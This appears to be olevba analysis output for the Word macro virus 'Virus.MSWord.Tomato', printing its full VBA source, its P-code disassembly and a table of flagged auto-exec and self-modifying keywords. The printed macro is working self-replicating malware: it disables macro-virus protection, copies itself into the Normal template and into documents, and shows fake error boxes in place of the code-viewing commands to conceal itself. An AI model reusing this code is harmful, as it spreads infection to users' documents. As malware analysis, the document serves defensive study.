olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tomato
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tomato - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
''Thus_001'
'---------------------------------------------------------------------
'Tomato
StartPos = 53
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = True
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Day(Now) = 13 Then
    Words.Item(1).InsertAfter ("Ńčä˙ň äâĺ ďîěčäîđęč â őîëîäčëüíîęĺ, ě¸đçíóň, ňóň îäí˙ ăîâîđčň: 'äŕ çŕäîëáŕëŕńü ˙ óćĺ ě¸đçíóňü!', äđóăŕ˙: 'ŕ-ŕ-ŕ ăîâîđ˙ůŕ˙ ďîěčäîđŕ!?!'")
End If
If Mid(ad.Lines(4, 1), 2, 6) <> "Tomato" Then
    If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.ReplaceLine 45, "Sub ViewVBCode1()"
    ad.ReplaceLine 49, "Sub ToolsMacro1()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End If
If Mid(nt.Lines(4, 1), 2, 6) <> "Tomato" Then
    If nt.CountOfLines > 0 Then nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    nt.ReplaceLine 45, "Sub ViewVBCode()"
    nt.ReplaceLine 49, "Sub ToolsMacro()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
Exit1:
End Sub

Private Sub Document_New()
    Document_Close
End Sub

Private Sub Document_Open()
    Document_Close
End Sub
 
Sub ViewVBCode1()
    MsgBox "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic", vbCritical
End Sub

Sub ToolsMacro1()
    MsgBox "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic", vbCritical
End Sub

' Ęîďč˙ą 159
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tomato
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4559 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x000A "'Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "---------------------------------------------------------------------"
' Line #3:
' 	QuoteRem 0x0000 0x0006 "Tomato"
' Line #4:
' 	LitDI2 0x0035 
' 	St StartPos 
' Line #5:
' 	OnError Exit1 
' Line #6:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #7:
' 	LitVarSpecial (True)
' 	St SaveNormalPrompt 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #10:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0086 "Ńčä˙ň äâĺ ďîěčäîđęč â őîëîäčëüíîęĺ, ě¸đçíóň, ňóň îäí˙ ăîâîđčň: 'äŕ çŕäîëáŕëŕńü ˙ óćĺ ě¸đçíóňü!', äđóăŕ˙: 'ŕ-ŕ-ŕ ăîâîđ˙ůŕ˙ ďîěčäîđŕ!?!'"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld Words 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0006 "Tomato"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld ad 
' 	ArgsMemCall InsertLines 0x0002 
' Line #17:
' 	LitDI2 0x002D 
' 	LitStr 0x0011 "Sub ViewVBCode1()"
' 	Ld ad 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #18:
' 	LitDI2 0x0031 
' 	LitStr 0x0011 "Sub ToolsMacro1()"
' 	Ld ad 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St virus_col 
' Line #20:
' 	Ld StartPos 
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	Ld virus_col 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0006 "Tomato"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld nt 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	LitDI2 0x002D 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #28:
' 	LitDI2 0x0031 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #29:
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St virus_col 
' Line #30:
' 	Ld StartPos 
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	Ld virus_col 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Label Exit1 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Private Sub Document_New())
' Line #37:
' 	ArgsCall Document_Close 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub Document_Open())
' Line #41:
' 	ArgsCall Document_Close 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub ViewVBCode1())
' Line #45:
' 	LitStr 0x0023 "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Sub ToolsMacro1())
' Line #49:
' 	LitStr 0x0023 "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	QuoteRem 0x0000 0x000B " Ęîďč˙ą 159"
' Line #53:
' 	QuoteRem 0x0000 0x0000 ""
' Line #54:
' 	QuoteRem 0x0000 0x0000 ""
' Line #55:
' 	QuoteRem 0x0000 0x0000 ""
' Line #56:
' 	QuoteRem 0x0000 0x0000 ""
' Line #57:
' 	QuoteRem 0x0000 0x0000 ""
' Line #58:
' 	QuoteRem 0x0000 0x0000 ""
' Line #59:
' 	QuoteRem 0x0000 0x0000 ""
' Line #60:
' 	QuoteRem 0x0000 0x0000 ""
' Line #61:
' 	QuoteRem 0x0000 0x0000 ""
' Line #62:
' 	QuoteRem 0x0000 0x0000 ""
' Line #63:
' 	QuoteRem 0x0000 0x0000 ""
' Line #64:
' 	QuoteRem 0x0000 0x0000 ""
' Line #65:
' 	QuoteRem 0x0000 0x0000 ""
' Line #66:
' 	QuoteRem 0x0000 0x0000 ""
' Line #67:
' 	QuoteRem 0x0000 0x0000 ""
' Line #68:
' 	QuoteRem 0x0000 0x0000 ""
' Line #69:
' 	QuoteRem 0x0000 0x0000 ""
' Line #70:
' 	QuoteRem 0x0000 0x0000 ""
' Line #71:
' 	QuoteRem 0x0000 0x0000 ""
' Line #72:
' 	QuoteRem 0x0000 0x0000 ""
' Line #73:
' 	QuoteRem 0x0000 0x0000 ""
' Line #74:
' 	QuoteRem 0x0000 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

